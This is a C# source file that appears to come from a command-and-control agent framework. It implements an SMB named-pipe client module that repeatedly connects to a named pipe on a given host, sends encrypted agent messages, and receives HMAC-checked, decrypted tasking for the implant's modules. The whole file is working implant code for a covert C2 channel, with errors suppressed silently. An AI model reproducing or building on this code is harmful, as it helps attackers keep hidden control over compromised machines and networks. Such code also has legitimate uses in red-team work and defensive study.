using Agent.Controllers;
using Agent.Interfaces;

using Common;
using Common.Models;

using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Modules
{
    class SmbStateObject
    {
        public NamedPipeClientStream workStream = null;
        public const int BufferSize = 65535;
        public byte[] buffer = new byte[BufferSize];
    }

    public class SmbClientModule : ICommModule
    {
        public string Hostname { get; private set; }
        public string PipeName { get; private set; }
        private ConfigController Config { get; set; }
        private CryptoController Crypto { get; set; }
        public ModuleStatus ModuleStatus { get; private set; }
        private Queue<AgentMessage> InboundC2Data { get; set; } = new Queue<AgentMessage>();
        private Queue<AgentMessage> OutboundC2Data { get; set; } = new Queue<AgentMessage>();

        private static ManualResetEvent AllDone = new ManualResetEvent(false);

        public SmbClientModule(string hostname, string pipename)
        {
            Hostname = hostname;
            PipeName = pipename;
        }

        public ModuleStatus GetStatus()
        {
            return ModuleStatus;
        }

        public void Init(ConfigController config, CryptoController crypto)
        {
            Config = config;
            Crypto = crypto;
        }

        public bool RecvData(out AgentMessage message)
        {
            if (InboundC2Data.Count > 0)
            {
                message = InboundC2Data.Dequeue();
                return true;
            }

            message = null;
            return false;
        }

        public void SendData(AgentMessage message)
        {
            OutboundC2Data.Enqueue(message);
        }

        public void Start()
        {
            ModuleStatus = ModuleStatus.Running;

            Task.Factory.StartNew(delegate ()
            {
                while (ModuleStatus == ModuleStatus.Running)
                {
                    try
                    {
                        AllDone.Reset();
                        var pipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut);
                        pipe.Connect(5000);
                        pipe.ReadMode = PipeTransmissionMode.Message;

                        var state = new SmbStateObject { workStream = pipe };
                        WriteData(state);
                        AllDone.WaitOne();

                        Thread.Sleep(1000);
                    }
                    catch { }

                    Thread.Sleep(1000);
                }
            });
        }

        private void WriteData(SmbStateObject state)
        {
            AllDone.Set();

            try
            {
                var messages = new List<AgentMessage>();
                
                if (OutboundC2Data.Count > 0)
                {
                    while (OutboundC2Data.Count != 0)
                    {
                        messages.Add(OutboundC2Data.Dequeue());
                    }
                }
                else
                {
                    messages.Add(new AgentMessage
                    {
                        IdempotencyKey = Guid.NewGuid().ToString(),
                        Metadata = new AgentMetadata(),
                        Data = new C2Data()
                    });
                }

                var encrypted = Crypto.Encrypt(messages);
                state.workStream.BeginWrite(encrypted, 0, encrypted.Length, new AsyncCallback(WriteCallback), state);
            }
            catch { }
        }

        private void WriteCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as SmbStateObject;
            state.workStream.EndWrite(ar);
            state.workStream.BeginRead(state.buffer, 0, state.buffer.Length, new AsyncCallback(ReadCallBack), state);
        }

        private void ReadCallBack(IAsyncResult ar)
        {
            var state = ar.AsyncState as SmbStateObject;
            var bytesReceived = state.workStream.EndRead(ar);

            if (bytesReceived > 0)
            {
                var dataReceived = state.buffer.TrimBytes();

                if (Crypto.VerifyHMAC(dataReceived))
                {
                    var messages = Crypto.Decrypt<List<AgentMessage>>(dataReceived);

                    if (messages != null)
                    {
                        foreach (var message in messages)
                        {
                            if (!string.IsNullOrEmpty(message.Data.Module))
                            {
                                InboundC2Data.Enqueue(message);
                            }
                        }
                    }
                }
            }

            state.workStream.Close();
        }

        public void Stop()
        {
            ModuleStatus = ModuleStatus.Stopped;
        }
    }
}